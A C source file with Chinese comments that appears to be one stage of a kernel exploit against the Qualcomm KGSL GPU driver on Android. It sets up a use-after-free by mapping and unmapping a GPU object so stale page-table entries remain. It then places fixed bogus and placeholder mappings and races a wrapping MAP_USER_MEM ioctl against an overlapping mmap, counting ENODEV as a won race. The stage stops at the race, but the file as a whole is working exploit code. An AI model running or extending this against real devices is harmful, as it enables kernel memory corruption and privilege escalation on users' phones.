/*
 * k3_stage_c.c — 阶段 C-1：单次竞速触发（只观测返回码，不提交 GPU 命令）
 *
 * 严格按 src_ref/poc_ex.c 的步骤 [1]–[9]：
 *   UAF alloc/mmap/munmap → BOGUS VMA → PLACEHOLDER → racer(MAP_USER_MEM wrap)
 *   → 主线程 mmap OVERLAP
 *
 * 判定（poc_ex.c:1861-1868）：
 *   OVERLAP mmap 返回 ENODEV(19)  → 竞速命中
 *   OVERLAP mmap 返回 ENOMEM(12)  → 未命中，无副作用
 *
 * 命中后立即退出进程，不做任何 GPU 命令、不读写悬垂 PTE。
 * 用法: k3_stage_c [attempts] [delay_us]
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL

static int fd = -1;

struct race_state {
	volatile int ready;
	volatile int started;
	volatile long result;
	volatile int saved_errno;
	uint64_t bogus_start;
	uint64_t wrap_size;
};

static void *racer(void *arg)
{
	struct race_state *rs = (struct race_state *)arg;
	struct kgsl_map_user_mem req;

	while (!rs->ready)
		__asm__ __volatile__("" ::: "memory");

	rs->started = 1;
	__sync_synchronize();

	memset(&req, 0, sizeof(req));
	req.fd = -1;
	req.gpuaddr = 0;
	req.len = rs->wrap_size;
	req.offset = 0;
	req.hostptr = (unsigned long)rs->bogus_start;
	req.memtype = KGSL_USER_MEM_TYPE_ADDR;
	req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

	errno = 0;
	rs->result = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
	rs->saved_errno = errno;
	__sync_synchronize();
	return NULL;
}

static int obj_alloc(uint64_t size, unsigned int *id, uint64_t *ms)
{
	struct kgsl_gpuobj_alloc al;

	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		printf("  ALLOC(0x%llx) FAIL errno=%d (%s)\n",
		       (unsigned long long)size, errno, strerror(errno));
		return -1;
	}
	*id = al.id;
	*ms = al.mmapsize;
	return 0;
}

static void obj_free(unsigned int id)
{
	struct kgsl_gpuobj_free fr;

	if (!id)
		return;
	memset(&fr, 0, sizeof(fr));
	fr.id = id;
	ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
}

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

int main(int argc, char **argv)
{
	int attempts = (argc > 1) ? atoi(argv[1]) : 1;
	int delay_us = (argc > 2) ? atoi(argv[2]) : 200;
	int hit = 0, miss = 0, other = 0;
	int i;

	printf("k3_stage_c | pid=%d uid=%d attempts=%d delay_us=%d\n", getpid(),
	       getuid(), attempts, delay_us);

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		printf("open FAIL errno=%d (%s)\n", errno, strerror(errno));
		return 1;
	}

	for (i = 0; i < attempts; i++) {
		unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
		uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
		void *p, *bogus_vma = MAP_FAILED, *ph_vma = MAP_FAILED;
		size_t k;
		struct race_state rs;
		pthread_t th;
		double t0;
		int mmap_errno = 0;
		int ret;

		printf("\n--- attempt %d/%d ---\n", i + 1, attempts);
		fflush(stdout);

		/* [1] UAF */
		if (obj_alloc(UAF_SIZE, &uaf_id, &uaf_ms))
			break;
		/* [2] OVERLAP（暂不 mmap） */
		if (obj_alloc(OVERLAP_SIZE, &ov_id, &ov_ms))
			break;

		/* [3] UAF mmap FIXED */
		p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
			 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
			 (off_t)uaf_id << 12);
		if (p == MAP_FAILED) {
			printf("  UAF mmap FAIL errno=%d (%s)\n", errno,
			       strerror(errno));
			break;
		}
		((volatile char *)p)[0] = 0x5a;
		((volatile char *)p)[uaf_ms - PAGE] = 0x5a;
		for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
			((volatile char *)p)[k] = 0x5a;

		/* [4] munmap，PTE/rbtree 条目残留 */
		munmap(p, (size_t)uaf_ms);

		/* [5] BOGUS 匿名 VMA */
		bogus_vma = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
				 PROT_READ | PROT_WRITE,
				 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
		if (bogus_vma == MAP_FAILED) {
			printf("  BOGUS mmap FAIL errno=%d (%s)\n", errno,
			       strerror(errno));
			break;
		}
		for (k = 0; k < 3; k++)
			((volatile char *)bogus_vma)[k * PAGE] = 1;

		/* [6][7] PLACEHOLDER */
		if (obj_alloc(PLACEH_SIZE, &ph_id, &ph_ms) == 0) {
			ph_vma = mmap((void *)(uintptr_t)PLACEH_START,
				      (size_t)ph_ms, PROT_READ | PROT_WRITE,
				      MAP_SHARED | MAP_FIXED, fd,
				      (off_t)ph_id << 12);
			if (ph_vma != MAP_FAILED) {
				((volatile char *)ph_vma)[0] = 1;
			} else {
				printf("  PLACEHOLDER mmap FAIL errno=%d\n",
				       errno);
			}
		}

		/* [8] 起 racer */
		memset(&rs, 0, sizeof(rs));
		rs.bogus_start = BOGUS_START;
		rs.wrap_size = WRAP_SIZE;
		rs.result = -1;
		if (pthread_create(&th, NULL, racer, &rs)) {
			printf("  pthread_create FAIL\n");
			break;
		}
		rs.ready = 1;
		__sync_synchronize();
		while (!rs.started)
			__asm__ __volatile__("" ::: "memory");
		if (delay_us > 0)
			usleep(delay_us);

		/* [9] 主线程 mmap OVERLAP */
		t0 = now_ms();
		p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
			 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
			 (off_t)ov_id << 12);
		mmap_errno = errno;
		pthread_join(th, NULL);
		t0 = now_ms() - t0;

		printf("  racer: ret=%ld errno=%d (%s)\n", rs.result,
		       rs.saved_errno, strerror(rs.saved_errno));
		if (p == MAP_FAILED)
			printf("  overlap mmap: FAIL errno=%d (%s)\n",
			       mmap_errno, strerror(mmap_errno));
		else
			printf("  overlap mmap: OK @%p\n", p);
		printf("  elapsed=%.1f ms\n", t0);

		if (p == MAP_FAILED && mmap_errno == ENODEV) {
			printf("  >>> RACE WON (ENODEV 19) <<<\n");
			hit++;
			/* 只记录，立即退出，不做任何后续操作 */
			printf("  exit immediately to avoid touching dirty PTE\n");
			fflush(stdout);
			_exit(0);
		} else if (p == MAP_FAILED && mmap_errno == ENOMEM) {
			miss++;
		} else {
			other++;
		}

		/* 清理（未命中路径） */
		if (p != MAP_FAILED)
			munmap(p, (size_t)ov_ms);
		if (ph_vma != MAP_FAILED)
			munmap(ph_vma, (size_t)ph_ms);
		if (bogus_vma != MAP_FAILED)
			munmap(bogus_vma, PAGE * 3);
		obj_free(ov_id);
		obj_free(ph_id);
		obj_free(uaf_id);
		usleep(100000);
	}

	printf("\nsummary: hit=%d miss=%d other=%d\n", hit, miss, other);
	close(fd);
	return hit ? 0 : (miss == attempts ? 3 : 2);
}
